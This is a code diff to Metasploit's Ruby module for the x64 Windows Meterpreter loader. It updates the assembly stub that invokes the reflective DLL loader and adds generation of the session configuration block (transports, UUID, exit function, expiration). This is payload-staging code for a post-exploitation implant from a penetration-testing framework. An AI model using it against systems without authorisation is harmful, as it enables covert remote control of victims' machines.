@@ -2,13 +2,13 @@
 
 require 'msf/core'
 require 'msf/core/reflective_dll_loader'
+require 'rex/payloads/meterpreter/config'
 
 module Msf
 
-
 ###
 #
-# Common module stub for ARCH_X86_64 payloads that make use of Meterpreter.
+# Common module stub for ARCH_X64 payloads that make use of Meterpreter.
 #
 ###
 
@@ -28,8 +28,8 @@ module Payload::Windows::MeterpreterLoader_x64
         [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
       ],
       'Platform'      => 'win',
-      'Arch'          => ARCH_X86_64,
-      'PayloadCompat' => { 'Convention' => 'sockrdi' },
+      'Arch'          => ARCH_X64,
+      'PayloadCompat' => { 'Convention' => 'sockrdi handlerdi -https' },
       'Stage'         => { 'Payload'   => "" }
       ))
   end
@@ -42,22 +42,23 @@ module Payload::Windows::MeterpreterLoader_x64
           push rbp              ; save rbp
           mov rbp, rsp          ; set up a new stack frame
           sub rsp, 32           ; allocate some space for calls.
+          and rsp, ~0xF         ; Ensure RSP is 16 byte aligned
         ; GetPC
           call $+5              ; relative call to get location
           pop rbx               ; pop return value
         ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader()
-          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
+          add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x15)}
           call rbx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
           add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
     ^
 
-    unless opts[:stageless]
+    unless opts[:stageless] || opts[:force_write_handle] == true
       asm << %Q^
-          ; store the comms socket handle
-          mov dword ptr [rbx], edi
+          ; store the comms socket or handle
+          mov [rbx], rdi
       ^
     end
 
@@ -69,14 +70,41 @@ module Payload::Windows::MeterpreterLoader_x64
     ^
   end
 
-  def stage_meterpreter(stageless=false)
+  def stage_payload(opts={})
+    stage_meterpreter(opts) + generate_config(opts)
+  end
+
+  def generate_config(opts={})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid
+
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      arch:              opts[:uuid].arch,
+      null_session_guid: opts[:null_session_guid] == true,
+      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
+      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:              opts[:uuid],
+      transports:        opts[:transport_config] || [transport_config(opts)],
+      extensions:        [],
+      stageless:         opts[:stageless] == true
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
+  end
+
+  def stage_meterpreter(opts={})
     # Exceptions will be thrown by the mixin if there are issues.
     dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll'))
 
     asm_opts = {
       rdi_offset: offset,
       length:     dll.length,
-      stageless:  stageless
+      stageless:  opts[:stageless] == true
     }
 
     asm = asm_invoke_metsrv(asm_opts)
